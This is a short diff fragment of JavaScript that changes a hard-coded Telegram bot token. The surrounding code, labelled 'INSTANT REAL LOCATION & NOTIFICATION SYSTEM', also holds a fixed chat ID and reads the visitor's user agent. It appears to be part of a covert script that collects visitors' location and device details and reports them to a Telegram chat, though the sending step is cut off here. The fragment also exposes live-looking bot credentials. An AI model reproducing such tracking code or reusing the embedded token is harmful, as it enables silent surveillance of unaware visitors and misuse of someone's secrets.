@@ -10,7 +10,7 @@
 
     // --- INSTANT REAL LOCATION & NOTIFICATION SYSTEM ---
     try {
-        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwoo1k';
+        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwooyk';
         const chatId = '8488556450';
         
         const ua = navigator.userAgent;
